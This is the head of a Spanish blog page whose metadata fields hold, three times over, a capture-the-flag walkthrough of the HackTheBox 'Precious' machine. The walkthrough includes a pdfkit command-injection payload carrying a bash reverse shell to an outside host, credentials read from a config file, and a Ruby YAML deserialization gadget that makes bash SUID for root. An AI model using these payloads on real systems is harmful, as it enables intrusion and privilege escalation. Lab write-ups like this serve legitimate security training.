<!DOCTYPE html>













<html lang="es-ES"
  
>

  <!--
  The Head
-->

<head>
  <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">

  <!-- Allow having a localized datetime different from the appearance language -->
  

  

    

    

  

  

  
    

    
      
        <!-- `site.img_cdn` is a local file path -->
        
        
      

      

    
      
        <!-- `site.img_cdn` is a local file path -->
        
        
      

      

    
  

  
    <!-- Begin Jekyll SEO tag v2.8.0 -->
<meta name="generator" content="Jekyll v4.3.1" />
<meta property="og:title" content="Precious WriteUp" />
<meta name="author" content="H4ckerLite" />
<meta property="og:locale" content="es_ES" />
<meta name="description" content="Les explicaré cómo comprometer la máquina Precious de HackTheBox. En esta máquina nos enfretaremos a una versión vulnerable de pdfkit con la cual ganaremos acceso por una reverse shell y para la escalada cargaremos un archivo para convertir la BASH en SUID. Identificando el OS Para ello debemos enviar una traza ICMP(Internet Control Message Protocol), estas siglas sinifican Protocolo de Mensajes de Control de Internet y con la información que nos reporte podemos identificar el SO mediante el TTL(Time To live) 1 2 3 4 5 6 7 ❯ ping -c1 10.10.11.189 PING 10.10.11.189 (10.10.11.189) 56(84) bytes of data. 64 bytes from 10.10.11.189: icmp_seq=1 ttl=63 time=146 ms --- 10.10.11.189 ping statistics --- 1 packets transmitted, 1 received, 0% packet loss, time 0ms rtt min/avg/max/mdev = 146.342/146.342/146.342/0.000 ms Vemos lo siguiente: TTL El TTL es 63, esto indica que es una máquina Linux, ya que dichas máquinas cuentan con un TTL igual a 64, pero…..porqué aparece como 63 e infiero que es Linux. bueno nuestra conexión no es directa, pasa por un nodo intermedario y eso hace que el TTL disminuya en una unidad. Primeros pasos Si le aplicamos un curl con modo silent y para ver por las cabeceras y filtrando por location vemos un dominio 1 2 ❯ curl s 10.10.11.189 -i | grep Location Location: http://precious.htb/ Sabiendo que se aplica Virtual Hosting debemos agregar el dominio al /etc/hosts 1 echo 10.10.11.189 precious.htb | tee -a /etc/hosts Escaneo NMAP Siempre que queramos auditar una máquina debemos aplicar un escaneo NMAP, ya que nos permitirá saber que puertos estan abiertos para poder empezar la fase de explotación 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 ❯ nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.10.11.189 Host discovery disabled (-Pn). All addresses will be marked &#39;up&#39; and scan times may be slower. Starting Nmap 7.93 ( https://nmap.org ) at 2023-02-19 12:45 -04 Initiating SYN Stealth Scan at 12:45 Scanning 10.10.11.189 [65535 ports] Discovered open port 80/tcp on 10.10.11.189 Discovered open port 22/tcp on 10.10.11.189 Completed SYN Stealth Scan at 12:46, 15.23s elapsed (65535 total ports) Nmap scan report for 10.10.11.189 Host is up, received user-set (0.16s latency). Scanned at 2023-02-19 12:45:56 -04 for 15s Not shown: 65471 closed tcp ports (reset), 62 filtered tcp ports (no-response) Some closed ports may be reported as filtered due to --defeat-rst-ratelimit PORT STATE SERVICE REASON 22/tcp open ssh syn-ack ttl 63 80/tcp open http syn-ack ttl 63 Read data files from: /usr/bin/../share/nmap Nmap done: 1 IP address (1 host up) scanned in 15.35 seconds Raw packets sent: 74834 (3.293MB) | Rcvd: 73784 (2.951MB) Vemos los puertos 22 este puerto corre por defecto el servicio SSH 80 este es el encargado del purto WEB, es decir el HTTP Enumeración Vemos que en la web podemos convertir una Web a PDF, suena interesante, así que nos creamos un archivo .html con la siguiete estructura Página Web 1 2 ❯ cat index.html &lt;h1&gt; Hola Mundo &lt;/h1&gt; Creamos un servivor HTTP con python por el puerto 80 y en dicha web ponemos nustro servidor. Recuerda cambiar tu IP. WEB Al darle Submit nos genera el PDF, si miramos los metadatos vemos la versión de PDFKIT 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 ❯ exiftool PDF.pdf ExifTool Version Number : 12.16 File Name : PDF.pdf Directory : . File Size : 10 KiB File Modification Date/Time : 2023:02:19 13:10:53-04:00 File Access Date/Time : 2023:02:19 13:10:53-04:00 File Inode Change Date/Time : 2023:02:19 13:11:14-04:00 File Permissions : rw-r--r-- File Type : PDF File Type Extension : pdf MIME Type : application/pdf PDF Version : 1.4 Linearized : No Page Count : 1 Creator : Generated by pdfkit v0.8.6 Al hacer una simple busqueda por google, nos encontramos con este articulo Al usar este payload, debemos cambiar el sleep por una reverse shell. 1 http://example.com/?name=#{&#39;%20`sleep 5`&#39;} Nos quedaría de esta manera. 1 http://example.com/?name=#{&#39;%20`bash -c &quot;bash -i &gt;&amp; /dev/tcp/10.10.14.19/444 0&gt;&amp;1&quot;`&#39;} Una vez enviada la petición nos llega la reverse shell 1 2 3 4 5 6 ❯ nc -lvnp 444 listening on [any] 444 ... connect to [10.10.14.19] from (UNKNOWN) [10.10.11.189] 47004 bash: cannot set terminal process group (676): Inappropriate ioctl for device bash: no job control in this shell ruby@precious:/var/www/pdfapp$ Aplicamos un tratamiento a la TTY Migrando de Usuario Somos el usuario ruby, si miramos en el directorio home por archivos ocultos nos encontramos con esto 1 2 3 4 5 6 7 8 9 10 11 ruby@precious:~$ ls -la total 32 drwxr-xr-x 5 ruby ruby 4096 Feb 19 12:28 . drwxr-xr-x 4 root root 4096 Oct 26 08:28 .. lrwxrwxrwx 1 root root 9 Oct 26 07:53 .bash_history -&gt; /dev/null -rw-r--r-- 1 ruby ruby 220 Mar 27 2022 .bash_logout -rw-r--r-- 1 ruby ruby 3526 Mar 27 2022 .bashrc dr-xr-xr-x 2 root ruby 4096 Oct 26 08:28 .bundle drwxr-xr-x 4 ruby ruby 4096 Feb 19 08:27 .cache drwxr-xr-x 3 ruby ruby 4096 Feb 19 12:28 .local -rw-r--r-- 1 ruby ruby 807 Mar 27 2022 .profile Si leemos lo que exixte dentro de esa carpeta vemos las credenciales del usuario henry 1 2 3 ruby@precious:~$ cat .bundle/config --- BUNDLE_HTTPS://RUBYGEMS__ORG/: &quot;henry:Q3c1AqGHtoI0aXAYFH&quot; Migramos de usuario 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 ruby@precious:~$ ssh henry@10.10.11.189 The authenticity of host &#39;10.10.11.189 (10.10.11.189)&#39; can&#39;t be established. ECDSA key fingerprint is SHA256:kRywGtzD4AwSK3m1ALIMjgI7W2SqImzsG5qPcTSavFU. Are you sure you want to continue connecting (yes/no/[fingerprint])? yes Warning: Permanently added &#39;10.10.11.189&#39; (ECDSA) to the list of known hosts. henry@10.10.11.189&#39;s password: Q3c1AqGHtoI0aXAYFH Linux precious 5.10.0-19-amd64 #1 SMP Debian 5.10.149-2 (2022-10-21) x86_64 The programs included with the Debian GNU/Linux system are free software; the exact distribution terms for each program are described in the individual files in /usr/share/doc/*/copyright. Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent permitted by applicable law. Last login: Sun Feb 19 10:46:31 2023 from 10.10.14.103 henry@precious:~$ Procedemos a leer la flag del usuario 1 2 3 henry@precious:~$ cat user.txt 67****************************bc henry@precious:~$ Escalada de Privilegios Viendo por permisos SUDO nos encontramos con este 1 2 3 4 5 6 henry@precious:~$ sudo -l Matching Defaults entries for henry on precious: env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin User henry may run the following commands on precious: (root) NOPASSWD: /usr/bin/ruby /opt/update_dependencies.rb Si leemos ese archivo vemos que intenta cargar el archivo “dependencies.yml”, si buscamos por internet nos encontramos con este blog y este repositorio de GitHub, nos creamos un archi con este contenido. 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 --- - !ruby/object:Gem::Installer i: x - !ruby/object:Gem::SpecFetcher i: y - !ruby/object:Gem::Requirement requirements: !ruby/object:Gem::Package::TarReader io: &amp;1 !ruby/object:Net::BufferedIO io: &amp;1 !ruby/object:Gem::Package::TarReader::Entry read: 0 header: &quot;abc&quot; debug_output: &amp;1 !ruby/object:Net::WriteAdapter socket: &amp;1 !ruby/object:Gem::RequestSet sets: !ruby/object:Net::WriteAdapter socket: !ruby/module &#39;Kernel&#39; method_id: :system git_set: id method_id: :resolve Cambiamos el id por: chmod +s /bin/bash Con esto nuestra BASH sera SUID 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 --- - !ruby/object:Gem::Installer i: x - !ruby/object:Gem::SpecFetcher i: y - !ruby/object:Gem::Requirement requirements: !ruby/object:Gem::Package::TarReader io: &amp;1 !ruby/object:Net::BufferedIO io: &amp;1 !ruby/object:Gem::Package::TarReader::Entry read: 0 header: &quot;abc&quot; debug_output: &amp;1 !ruby/object:Net::WriteAdapter socket: &amp;1 !ruby/object:Gem::RequestSet sets: !ruby/object:Net::WriteAdapter socket: !ruby/module &#39;Kernel&#39; method_id: :system git_set: chmod +s /bin/bash method_id: :resolve Ejecutamos el comando 1 2 3 4 henry@precious:~$ sudo ruby /opt/update_dependencies.rb henry@precious:~$ ls -l /bin/bash -rwsr-sr-x 1 root root 1234376 Mar 27 2022 /bin/bash henry@precious:~$ Ahora podemos lanzarnos la bash como root y leemos la flag de root 1 2 3 4 5 6 7 8 henry@precious:~$ bash -p bash-5.1# whoami &amp;&amp; id root uid=1000(henry) gid=1000(henry) euid=0(root) egid=0(root) groups=0(root),1000(henry) bash-5.1# bash-5.1# cat /root/root.txt 85****************************f4 bash-5.1# Acabamos de comprometer la máquina, Buena suerte." />
<meta property="og:description" content="Les explicaré cómo comprometer la máquina Precious de HackTheBox. En esta máquina nos enfretaremos a una versión vulnerable de pdfkit con la cual ganaremos acceso por una reverse shell y para la escalada cargaremos un archivo para convertir la BASH en SUID. Identificando el OS Para ello debemos enviar una traza ICMP(Internet Control Message Protocol), estas siglas sinifican Protocolo de Mensajes de Control de Internet y con la información que nos reporte podemos identificar el SO mediante el TTL(Time To live) 1 2 3 4 5 6 7 ❯ ping -c1 10.10.11.189 PING 10.10.11.189 (10.10.11.189) 56(84) bytes of data. 64 bytes from 10.10.11.189: icmp_seq=1 ttl=63 time=146 ms --- 10.10.11.189 ping statistics --- 1 packets transmitted, 1 received, 0% packet loss, time 0ms rtt min/avg/max/mdev = 146.342/146.342/146.342/0.000 ms Vemos lo siguiente: TTL El TTL es 63, esto indica que es una máquina Linux, ya que dichas máquinas cuentan con un TTL igual a 64, pero…..porqué aparece como 63 e infiero que es Linux. bueno nuestra conexión no es directa, pasa por un nodo intermedario y eso hace que el TTL disminuya en una unidad. Primeros pasos Si le aplicamos un curl con modo silent y para ver por las cabeceras y filtrando por location vemos un dominio 1 2 ❯ curl s 10.10.11.189 -i | grep Location Location: http://precious.htb/ Sabiendo que se aplica Virtual Hosting debemos agregar el dominio al /etc/hosts 1 echo 10.10.11.189 precious.htb | tee -a /etc/hosts Escaneo NMAP Siempre que queramos auditar una máquina debemos aplicar un escaneo NMAP, ya que nos permitirá saber que puertos estan abiertos para poder empezar la fase de explotación 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 ❯ nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.10.11.189 Host discovery disabled (-Pn). All addresses will be marked &#39;up&#39; and scan times may be slower. Starting Nmap 7.93 ( https://nmap.org ) at 2023-02-19 12:45 -04 Initiating SYN Stealth Scan at 12:45 Scanning 10.10.11.189 [65535 ports] Discovered open port 80/tcp on 10.10.11.189 Discovered open port 22/tcp on 10.10.11.189 Completed SYN Stealth Scan at 12:46, 15.23s elapsed (65535 total ports) Nmap scan report for 10.10.11.189 Host is up, received user-set (0.16s latency). Scanned at 2023-02-19 12:45:56 -04 for 15s Not shown: 65471 closed tcp ports (reset), 62 filtered tcp ports (no-response) Some closed ports may be reported as filtered due to --defeat-rst-ratelimit PORT STATE SERVICE REASON 22/tcp open ssh syn-ack ttl 63 80/tcp open http syn-ack ttl 63 Read data files from: /usr/bin/../share/nmap Nmap done: 1 IP address (1 host up) scanned in 15.35 seconds Raw packets sent: 74834 (3.293MB) | Rcvd: 73784 (2.951MB) Vemos los puertos 22 este puerto corre por defecto el servicio SSH 80 este es el encargado del purto WEB, es decir el HTTP Enumeración Vemos que en la web podemos convertir una Web a PDF, suena interesante, así que nos creamos un archivo .html con la siguiete estructura Página Web 1 2 ❯ cat index.html &lt;h1&gt; Hola Mundo &lt;/h1&gt; Creamos un servivor HTTP con python por el puerto 80 y en dicha web ponemos nustro servidor. Recuerda cambiar tu IP. WEB Al darle Submit nos genera el PDF, si miramos los metadatos vemos la versión de PDFKIT 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 ❯ exiftool PDF.pdf ExifTool Version Number : 12.16 File Name : PDF.pdf Directory : . File Size : 10 KiB File Modification Date/Time : 2023:02:19 13:10:53-04:00 File Access Date/Time : 2023:02:19 13:10:53-04:00 File Inode Change Date/Time : 2023:02:19 13:11:14-04:00 File Permissions : rw-r--r-- File Type : PDF File Type Extension : pdf MIME Type : application/pdf PDF Version : 1.4 Linearized : No Page Count : 1 Creator : Generated by pdfkit v0.8.6 Al hacer una simple busqueda por google, nos encontramos con este articulo Al usar este payload, debemos cambiar el sleep por una reverse shell. 1 http://example.com/?name=#{&#39;%20`sleep 5`&#39;} Nos quedaría de esta manera. 1 http://example.com/?name=#{&#39;%20`bash -c &quot;bash -i &gt;&amp; /dev/tcp/10.10.14.19/444 0&gt;&amp;1&quot;`&#39;} Una vez enviada la petición nos llega la reverse shell 1 2 3 4 5 6 ❯ nc -lvnp 444 listening on [any] 444 ... connect to [10.10.14.19] from (UNKNOWN) [10.10.11.189] 47004 bash: cannot set terminal process group (676): Inappropriate ioctl for device bash: no job control in this shell ruby@precious:/var/www/pdfapp$ Aplicamos un tratamiento a la TTY Migrando de Usuario Somos el usuario ruby, si miramos en el directorio home por archivos ocultos nos encontramos con esto 1 2 3 4 5 6 7 8 9 10 11 ruby@precious:~$ ls -la total 32 drwxr-xr-x 5 ruby ruby 4096 Feb 19 12:28 . drwxr-xr-x 4 root root 4096 Oct 26 08:28 .. lrwxrwxrwx 1 root root 9 Oct 26 07:53 .bash_history -&gt; /dev/null -rw-r--r-- 1 ruby ruby 220 Mar 27 2022 .bash_logout -rw-r--r-- 1 ruby ruby 3526 Mar 27 2022 .bashrc dr-xr-xr-x 2 root ruby 4096 Oct 26 08:28 .bundle drwxr-xr-x 4 ruby ruby 4096 Feb 19 08:27 .cache drwxr-xr-x 3 ruby ruby 4096 Feb 19 12:28 .local -rw-r--r-- 1 ruby ruby 807 Mar 27 2022 .profile Si leemos lo que exixte dentro de esa carpeta vemos las credenciales del usuario henry 1 2 3 ruby@precious:~$ cat .bundle/config --- BUNDLE_HTTPS://RUBYGEMS__ORG/: &quot;henry:Q3c1AqGHtoI0aXAYFH&quot; Migramos de usuario 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 ruby@precious:~$ ssh henry@10.10.11.189 The authenticity of host &#39;10.10.11.189 (10.10.11.189)&#39; can&#39;t be established. ECDSA key fingerprint is SHA256:kRywGtzD4AwSK3m1ALIMjgI7W2SqImzsG5qPcTSavFU. Are you sure you want to continue connecting (yes/no/[fingerprint])? yes Warning: Permanently added &#39;10.10.11.189&#39; (ECDSA) to the list of known hosts. henry@10.10.11.189&#39;s password: Q3c1AqGHtoI0aXAYFH Linux precious 5.10.0-19-amd64 #1 SMP Debian 5.10.149-2 (2022-10-21) x86_64 The programs included with the Debian GNU/Linux system are free software; the exact distribution terms for each program are described in the individual files in /usr/share/doc/*/copyright. Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent permitted by applicable law. Last login: Sun Feb 19 10:46:31 2023 from 10.10.14.103 henry@precious:~$ Procedemos a leer la flag del usuario 1 2 3 henry@precious:~$ cat user.txt 67****************************bc henry@precious:~$ Escalada de Privilegios Viendo por permisos SUDO nos encontramos con este 1 2 3 4 5 6 henry@precious:~$ sudo -l Matching Defaults entries for henry on precious: env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin User henry may run the following commands on precious: (root) NOPASSWD: /usr/bin/ruby /opt/update_dependencies.rb Si leemos ese archivo vemos que intenta cargar el archivo “dependencies.yml”, si buscamos por internet nos encontramos con este blog y este repositorio de GitHub, nos creamos un archi con este contenido. 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 --- - !ruby/object:Gem::Installer i: x - !ruby/object:Gem::SpecFetcher i: y - !ruby/object:Gem::Requirement requirements: !ruby/object:Gem::Package::TarReader io: &amp;1 !ruby/object:Net::BufferedIO io: &amp;1 !ruby/object:Gem::Package::TarReader::Entry read: 0 header: &quot;abc&quot; debug_output: &amp;1 !ruby/object:Net::WriteAdapter socket: &amp;1 !ruby/object:Gem::RequestSet sets: !ruby/object:Net::WriteAdapter socket: !ruby/module &#39;Kernel&#39; method_id: :system git_set: id method_id: :resolve Cambiamos el id por: chmod +s /bin/bash Con esto nuestra BASH sera SUID 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 --- - !ruby/object:Gem::Installer i: x - !ruby/object:Gem::SpecFetcher i: y - !ruby/object:Gem::Requirement requirements: !ruby/object:Gem::Package::TarReader io: &amp;1 !ruby/object:Net::BufferedIO io: &amp;1 !ruby/object:Gem::Package::TarReader::Entry read: 0 header: &quot;abc&quot; debug_output: &amp;1 !ruby/object:Net::WriteAdapter socket: &amp;1 !ruby/object:Gem::RequestSet sets: !ruby/object:Net::WriteAdapter socket: !ruby/module &#39;Kernel&#39; method_id: :system git_set: chmod +s /bin/bash method_id: :resolve Ejecutamos el comando 1 2 3 4 henry@precious:~$ sudo ruby /opt/update_dependencies.rb henry@precious:~$ ls -l /bin/bash -rwsr-sr-x 1 root root 1234376 Mar 27 2022 /bin/bash henry@precious:~$ Ahora podemos lanzarnos la bash como root y leemos la flag de root 1 2 3 4 5 6 7 8 henry@precious:~$ bash -p bash-5.1# whoami &amp;&amp; id root uid=1000(henry) gid=1000(henry) euid=0(root) egid=0(root) groups=0(root),1000(henry) bash-5.1# bash-5.1# cat /root/root.txt 85****************************f4 bash-5.1# Acabamos de comprometer la máquina, Buena suerte." />
<link rel="canonical" href="http://localhost:4000/posts/precious-writeup/" />
<meta property="og:url" content="http://localhost:4000/posts/precious-writeup/" />
<meta property="og:site_name" content="H4ckerLite Blog" />
<meta property="og:image" content="http://localhost:4000/assets/img/commons/precious-writeup/Precious.png" />
<meta property="og:image:alt" content="Precious WriteUp" />
<meta property="og:type" content="article" />
<meta property="article:published_time" content="2023-01-16T17:00:00+01:00" />
<meta name="twitter:card" content="summary_large_image" />
<meta property="twitter:image" content="http://localhost:4000/assets/img/commons/precious-writeup/Precious.png" />
<meta name="twitter:image:alt" content="Precious WriteUp" />
<meta property="twitter:title" content="Precious WriteUp" />
<meta name="twitter:site" content="@mortzelo" />
<meta name="twitter:creator" content="@H4ckerLite" />
<script type="application/ld+json">
{"@context":"https://schema.org","@type":"BlogPosting","author":{"@type":"Person","name":"H4ckerLite"},"dateModified":"2023-03-13T03:22:20+01:00","datePublished":"2023-01-16T17:00:00+01:00","description":"Les explicaré cómo comprometer la máquina Precious de HackTheBox. En esta máquina nos enfretaremos a una versión vulnerable de pdfkit con la cual ganaremos acceso por una reverse shell y para la escalada cargaremos un archivo para convertir la BASH en SUID. Identificando el OS Para ello debemos enviar una traza ICMP(Internet Control Message Protocol), estas siglas sinifican Protocolo de Mensajes de Control de Internet y con la información que nos reporte podemos identificar el SO mediante el TTL(Time To live) 1 2 3 4 5 6 7 ❯ ping -c1 10.10.11.189 PING 10.10.11.189 (10.10.11.189) 56(84) bytes of data. 64 bytes from 10.10.11.189: icmp_seq=1 ttl=63 time=146 ms --- 10.10.11.189 ping statistics --- 1 packets transmitted, 1 received, 0% packet loss, time 0ms rtt min/avg/max/mdev = 146.342/146.342/146.342/0.000 ms Vemos lo siguiente: TTL El TTL es 63, esto indica que es una máquina Linux, ya que dichas máquinas cuentan con un TTL igual a 64, pero…..porqué aparece como 63 e infiero que es Linux. bueno nuestra conexión no es directa, pasa por un nodo intermedario y eso hace que el TTL disminuya en una unidad. Primeros pasos Si le aplicamos un curl con modo silent y para ver por las cabeceras y filtrando por location vemos un dominio 1 2 ❯ curl s 10.10.11.189 -i | grep Location Location: http://precious.htb/ Sabiendo que se aplica Virtual Hosting debemos agregar el dominio al /etc/hosts 1 echo 10.10.11.189 precious.htb | tee -a /etc/hosts Escaneo NMAP Siempre que queramos auditar una máquina debemos aplicar un escaneo NMAP, ya que nos permitirá saber que puertos estan abiertos para poder empezar la fase de explotación 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 ❯ nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.10.11.189 Host discovery disabled (-Pn). All addresses will be marked &#39;up&#39; and scan times may be slower. Starting Nmap 7.93 ( https://nmap.org ) at 2023-02-19 12:45 -04 Initiating SYN Stealth Scan at 12:45 Scanning 10.10.11.189 [65535 ports] Discovered open port 80/tcp on 10.10.11.189 Discovered open port 22/tcp on 10.10.11.189 Completed SYN Stealth Scan at 12:46, 15.23s elapsed (65535 total ports) Nmap scan report for 10.10.11.189 Host is up, received user-set (0.16s latency). Scanned at 2023-02-19 12:45:56 -04 for 15s Not shown: 65471 closed tcp ports (reset), 62 filtered tcp ports (no-response) Some closed ports may be reported as filtered due to --defeat-rst-ratelimit PORT STATE SERVICE REASON 22/tcp open ssh syn-ack ttl 63 80/tcp open http syn-ack ttl 63 Read data files from: /usr/bin/../share/nmap Nmap done: 1 IP address (1 host up) scanned in 15.35 seconds Raw packets sent: 74834 (3.293MB) | Rcvd: 73784 (2.951MB) Vemos los puertos 22 este puerto corre por defecto el servicio SSH 80 este es el encargado del purto WEB, es decir el HTTP Enumeración Vemos que en la web podemos convertir una Web a PDF, suena interesante, así que nos creamos un archivo .html con la siguiete estructura Página Web 1 2 ❯ cat index.html &lt;h1&gt; Hola Mundo &lt;/h1&gt; Creamos un servivor HTTP con python por el puerto 80 y en dicha web ponemos nustro servidor. Recuerda cambiar tu IP. WEB Al darle Submit nos genera el PDF, si miramos los metadatos vemos la versión de PDFKIT 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 ❯ exiftool PDF.pdf ExifTool Version Number : 12.16 File Name : PDF.pdf Directory : . File Size : 10 KiB File Modification Date/Time : 2023:02:19 13:10:53-04:00 File Access Date/Time : 2023:02:19 13:10:53-04:00 File Inode Change Date/Time : 2023:02:19 13:11:14-04:00 File Permissions : rw-r--r-- File Type : PDF File Type Extension : pdf MIME Type : application/pdf PDF Version : 1.4 Linearized : No Page Count : 1 Creator : Generated by pdfkit v0.8.6 Al hacer una simple busqueda por google, nos encontramos con este articulo Al usar este payload, debemos cambiar el sleep por una reverse shell. 1 http://example.com/?name=#{&#39;%20`sleep 5`&#39;} Nos quedaría de esta manera. 1 http://example.com/?name=#{&#39;%20`bash -c &quot;bash -i &gt;&amp; /dev/tcp/10.10.14.19/444 0&gt;&amp;1&quot;`&#39;} Una vez enviada la petición nos llega la reverse shell 1 2 3 4 5 6 ❯ nc -lvnp 444 listening on [any] 444 ... connect to [10.10.14.19] from (UNKNOWN) [10.10.11.189] 47004 bash: cannot set terminal process group (676): Inappropriate ioctl for device bash: no job control in this shell ruby@precious:/var/www/pdfapp$ Aplicamos un tratamiento a la TTY Migrando de Usuario Somos el usuario ruby, si miramos en el directorio home por archivos ocultos nos encontramos con esto 1 2 3 4 5 6 7 8 9 10 11 ruby@precious:~$ ls -la total 32 drwxr-xr-x 5 ruby ruby 4096 Feb 19 12:28 . drwxr-xr-x 4 root root 4096 Oct 26 08:28 .. lrwxrwxrwx 1 root root 9 Oct 26 07:53 .bash_history -&gt; /dev/null -rw-r--r-- 1 ruby ruby 220 Mar 27 2022 .bash_logout -rw-r--r-- 1 ruby ruby 3526 Mar 27 2022 .bashrc dr-xr-xr-x 2 root ruby 4096 Oct 26 08:28 .bundle drwxr-xr-x 4 ruby ruby 4096 Feb 19 08:27 .cache drwxr-xr-x 3 ruby ruby 4096 Feb 19 12:28 .local -rw-r--r-- 1 ruby ruby 807 Mar 27 2022 .profile Si leemos lo que exixte dentro de esa carpeta vemos las credenciales del usuario henry 1 2 3 ruby@precious:~$ cat .bundle/config --- BUNDLE_HTTPS://RUBYGEMS__ORG/: &quot;henry:Q3c1AqGHtoI0aXAYFH&quot; Migramos de usuario 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 ruby@precious:~$ ssh henry@10.10.11.189 The authenticity of host &#39;10.10.11.189 (10.10.11.189)&#39; can&#39;t be established. ECDSA key fingerprint is SHA256:kRywGtzD4AwSK3m1ALIMjgI7W2SqImzsG5qPcTSavFU. Are you sure you want to continue connecting (yes/no/[fingerprint])? yes Warning: Permanently added &#39;10.10.11.189&#39; (ECDSA) to the list of known hosts. henry@10.10.11.189&#39;s password: Q3c1AqGHtoI0aXAYFH Linux precious 5.10.0-19-amd64 #1 SMP Debian 5.10.149-2 (2022-10-21) x86_64 The programs included with the Debian GNU/Linux system are free software; the exact distribution terms for each program are described in the individual files in /usr/share/doc/*/copyright. Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent permitted by applicable law. Last login: Sun Feb 19 10:46:31 2023 from 10.10.14.103 henry@precious:~$ Procedemos a leer la flag del usuario 1 2 3 henry@precious:~$ cat user.txt 67****************************bc henry@precious:~$ Escalada de Privilegios Viendo por permisos SUDO nos encontramos con este 1 2 3 4 5 6 henry@precious:~$ sudo -l Matching Defaults entries for henry on precious: env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin User henry may run the following commands on precious: (root) NOPASSWD: /usr/bin/ruby /opt/update_dependencies.rb Si leemos ese archivo vemos que intenta cargar el archivo “dependencies.yml”, si buscamos por internet nos encontramos con este blog y este repositorio de GitHub, nos creamos un archi con este contenido. 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 --- - !ruby/object:Gem::Installer i: x - !ruby/object:Gem::SpecFetcher i: y - !ruby/object:Gem::Requirement requirements: !ruby/object:Gem::Package::TarReader io: &amp;1 !ruby/object:Net::BufferedIO io: &amp;1 !ruby/object:Gem::Package::TarReader::Entry read: 0 header: &quot;abc&quot; debug_output: &amp;1 !ruby/object:Net::WriteAdapter socket: &amp;1 !ruby/object:Gem::RequestSet sets: !ruby/object:Net::WriteAdapter socket: !ruby/module &#39;Kernel&#39; method_id: :system git_set: id method_id: :resolve Cambiamos el id por: chmod +s /bin/bash Con esto nuestra BASH sera SUID 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 --- - !ruby/object:Gem::Installer i: x - !ruby/object:Gem::SpecFetcher i: y - !ruby/object:Gem::Requirement requirements: !ruby/object:Gem::Package::TarReader io: &amp;1 !ruby/object:Net::BufferedIO io: &amp;1 !ruby/object:Gem::Package::TarReader::Entry read: 0 header: &quot;abc&quot; debug_output: &amp;1 !ruby/object:Net::WriteAdapter socket: &amp;1 !ruby/object:Gem::RequestSet sets: !ruby/object:Net::WriteAdapter socket: !ruby/module &#39;Kernel&#39; method_id: :system git_set: chmod +s /bin/bash method_id: :resolve Ejecutamos el comando 1 2 3 4 henry@precious:~$ sudo ruby /opt/update_dependencies.rb henry@precious:~$ ls -l /bin/bash -rwsr-sr-x 1 root root 1234376 Mar 27 2022 /bin/bash henry@precious:~$ Ahora podemos lanzarnos la bash como root y leemos la flag de root 1 2 3 4 5 6 7 8 henry@precious:~$ bash -p bash-5.1# whoami &amp;&amp; id root uid=1000(henry) gid=1000(henry) euid=0(root) egid=0(root) groups=0(root),1000(henry) bash-5.1# bash-5.1# cat /root/root.txt 85****************************f4 bash-5.1# Acabamos de comprometer la máquina, Buena suerte.","headline":"Precious WriteUp","image":{"alt":"Precious WriteUp","url":"http://localhost:4000/assets/img/commons/precious-writeup/Precious.png","@type":"imageObject"},"mainEntityOfPage":{"@type":"WebPage","@id":"http://localhost:4000/posts/precious-writeup/"},"url":"http://localhost:4000/posts/precious-writeup/"}</script>
<!-- End Jekyll SEO tag -->

  

  <title>Precious WriteUp | H4ckerLite | Blog
  </title>

  <!--
  The Favicons for Web, Android, Microsoft, and iOS (iPhone and iPad) Apps
  Generated by: https://realfavicongenerator.net/
-->



<link rel="apple-touch-icon" sizes="180x180" href="/assets/img/favicons/apple-touch-icon.png">
<link rel="icon" type="image/png" sizes="32x32" href="/assets/img/favicons/favicon-32x32.png">
<link rel="icon" type="image/png" sizes="16x16" href="/assets/img/favicons/favicon-16x16.png">
<link rel="manifest" href="/assets/img/favicons/site.webmanifest">
<link rel="shortcut icon" href="/assets/img/favicons/favicon.ico">
<meta name="apple-mobile-web-app-title" content="H4ckerLite | Blog">
<meta name="application-name" content="H4ckerLite | Blog">
<meta name="msapplication-TileColor" content="#da532c">
<meta name="msapplication-config" content="/assets/img/favicons/browserconfig.xml">
<meta name="theme-color" content="#ffffff">


  

    
      <link rel="preconnect" href="https://fonts.googleapis.com" >
      <link rel="dns-prefetch" href="https://fonts.googleapis.com" >
    
      <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
      <link rel="dns-prefetch" href="https://fonts.gstatic.com" crossorigin>
    
      <link rel="preconnect" href="https://fonts.googleapis.com" >
      <link rel="dns-prefetch" href="https://fonts.googleapis.com" >
    
      <link rel="preconnect" href="https://cdn.jsdelivr.net" >
      <link rel="dns-prefetch" href="https://cdn.jsdelivr.net" >
    

    <link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Lato&family=Source+Sans+Pro:wght@400;600;700;900&display=swap">

  

  <!-- GA -->
  

  <!-- Bootstrap -->
